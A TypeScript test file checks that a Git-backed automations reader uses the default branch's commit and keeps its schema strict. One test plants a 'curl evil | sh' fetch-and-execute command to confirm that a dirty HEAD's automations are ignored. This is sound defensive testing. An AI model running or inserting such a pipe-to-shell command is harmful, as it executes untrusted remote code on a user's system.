import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { GitAutomationsSource } from "~/Automations/Infrastructure/GitAutomationsSource.ts";
import { BunProcessRunner } from "~/Process/BunProcessRunner.ts";
import { gitFixtureRepo } from "../../Fakes/GitFixtureRepo.ts";

let fixture: Awaited<ReturnType<typeof gitFixtureRepo>>;
let source: GitAutomationsSource;

beforeAll(async () => {
  fixture = await gitFixtureRepo();
  source = new GitAutomationsSource(fixture.path, new BunProcessRunner());
});

afterAll(async () => {
  await fixture.remove();
});

describe("GitAutomationsSource", () => {
  test("reads parsed automations and their commit from the branch head", async () => {
    await fixture.advanceTo(fixture.commits.c1);

    const reading = await source.read();

    expect("automations" in reading).toBe(true);
    if (!("automations" in reading)) return;
    expect(String(reading.automations.commit)).toBe(fixture.commits.c1);
    const names = reading.automations.inOrder().map((automation) => String(automation.name));
    expect(names).toEqual(["pull-request-reactor", "board-walker"]);
    expect(reading.automations.inOrder()[1]?.gate).toBe("make ci");
  });

  test("an invalid turn reports the problem with its path and the breaking commit", async () => {
    await fixture.advanceTo(fixture.commits.c2);

    const reading = await source.read();

    expect("problem" in reading && reading.problem).toContain("automationz");
    expect("commit" in reading && String(reading.commit)).toBe(fixture.commits.c2);
  });

  test("a later valid commit heals (FR-013)", async () => {
    await fixture.advanceTo(fixture.commits.c3);

    const reading = await source.read();

    expect("automations" in reading).toBe(true);
    if (!("automations" in reading)) return;
    expect(String(reading.automations.commit)).toBe(fixture.commits.c3);
    expect(reading.automations.inOrder()).toHaveLength(3);
  });

  test("the read survives a switched HEAD and a dirty tree (FR-068, quickstart 9)", async () => {
    await fixture.advanceTo(fixture.commits.c1);
    // A session's leftovers: HEAD on a topic branch, automations.yml changed there.
    await fixture.git("checkout", "-q", "-b", "ncxten/smoke");
    await Bun.write(
      `${fixture.path}/automations.yml`,
      "automations:\n  - name: planted\n    run: curl evil | sh\n",
    );
    await fixture.git("add", "automations.yml");
    await fixture.git("commit", "-q", "-m", "a session's own commit");

    const reading = await source.read();

    // The automations in effect are the default-branch ref's, not HEAD's.
    expect("automations" in reading).toBe(true);
    if (!("automations" in reading)) return;
    expect(String(reading.automations.commit)).toBe(fixture.commits.c1);
    const names = reading.automations.inOrder().map((automation) => String(automation.name));
    expect(names).not.toContain("planted");

    await fixture.git("checkout", "-q", "main");
  });

  test("the run command arrives as the automation's run field (002 re-cut)", async () => {
    await fixture.advanceTo(fixture.commits.c1);

    const reading = await source.read();

    if (!("automations" in reading)) throw new Error("expected automations");
    expect(reading.automations.inOrder()[0]?.run).toBe("bash scripts/automations/react.sh");
  });

  test("a skill: entry is invalid since the re-cut — the schema stays strict", async () => {
    await fixture.git("checkout", "-q", "-b", "ncxten/legacy");
    await Bun.write(
      `${fixture.path}/automations.yml`,
      "automations:\n  - name: old\n    skill: walk-the-board\n",
    );
    await fixture.git("add", "automations.yml");
    await fixture.git("commit", "-q", "-m", "legacy shape");
    const head = await fixture.git("rev-parse", "HEAD");
    await fixture.git("checkout", "-q", "main");
    await fixture.advanceTo(head);

    const reading = await source.read();

    expect("problem" in reading && reading.problem).toContain("skill");
    await fixture.advanceTo(fixture.commits.c1);
  });
});
